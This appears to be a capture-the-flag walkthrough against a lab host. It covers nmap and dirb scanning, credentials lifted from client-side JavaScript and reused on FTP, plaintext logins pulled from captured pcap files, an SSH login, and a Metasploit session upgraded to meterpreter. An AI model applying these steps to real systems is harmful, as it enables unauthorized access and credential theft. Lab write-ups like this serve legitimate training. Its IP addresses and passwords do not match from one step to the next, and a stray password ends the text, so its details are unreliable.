# Information Gathering

## nmap scan:
quickly identify all open ports:
`nmap -sS -p- -T5 10.10.18.177`
scan ports for service info:
`nmap -sV -C -O -p 22,80,37370 10.10.18.117`
output:
```
host          port   proto  name  state  info
----          ----   -----  ----  -----  ----
10.10.18.177  22     tcp    ssh   open   OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 Ubuntu Linux; protocol 2.0

10.10.18.177  80     tcp    http  open   Apache httpd 2.4.41 (Ubuntu)

10.10.18.177  37370  tcp    ftp   open   vsftpd 3.0.3
```

## crawl website:
The website is for a photography company, the site has a landing page, a photo gallery page and a price page  
- http://10.10.18.177/index.html
- http://10.10.18.177/gallery/gallery.html
	- http://10.10.18.177/static/<1-18>
- http://10.10.18.177/pricing/pricing.html

# Enumeration

## directory fuzzing:
basic fuzzing for hidden directories:
`dirb 10.10.18.177`

- /gallery/
- /static/
	- 00
	- 1 to 18
- /pricing/

there is something very interesting on http://10.10.18.177/static/00
```/static/00
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
```

we have a possible username: valleyDev

let's check the /dev1243224123123 directory out

It turns out, it's a login page, we can attempt to exploit or brute-force the page.
It appears that the credentials aren't even sent over the network, which means one of two things, or the site isn't built yet, or it's handling login functionality client-side. As a hail mary let's inspect the source code:

view-source:http://10.10.18.177/dev1243224123123/
we found something interesting in:
view-source:http://10.10.18.177/dev1243224123123/dev.js

```js
if (username === "siemDev" && password === "california") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";
    } else {
        loginErrorMsg.style.opacity = 1;
    }
```

bingo! credentials: siemDev | california

after using the credentials on the login page we are redirected to another dev note:
```
dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port
```

 from /dev1243224123123/devNotes37370.txt we can conclude that the same credentials can be used in the ftp server.

# Exploitation

now let's interact and exploit the sever, starting with ftp:

`ftp siemDev@10.10.18.117 -p 37370`
`ftp> ls`
```ftp
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
-rw-rw-r--    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
-rw-rw-r--    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
226 Directory send OK.
```

`ftp> get siemFTP.pcapng`
`ftp> get siemHTTP1.pcapng`
`ftp> get siemHTTP2.pcapng`

Let's examine these pcap files with wireshark looking for anything with the words password and or username, especially in http POST requests.

got one in siemHTTP2.pcapng
valleyDev | ph0t01234

Let's try and use these credentials on the SSH server

ssh valleyDev@10.10.18.117
# Post Exploitation

we can use ssh_login msf to connect to ssh and upgrade to a meterpreter shell
```
msf6> search ssh_login
msf6> use 0
msf6> set RHOSTS 10.10.18.117
msf6> set USERNAME valleyDev
msf6> set PASSWORD ph0t0s1234
msf6> run

background the ssh session (ctrl+z).

msf6> sessions -u 1
msf6> sessions -i 2

meterpreter> 
```

liberty123

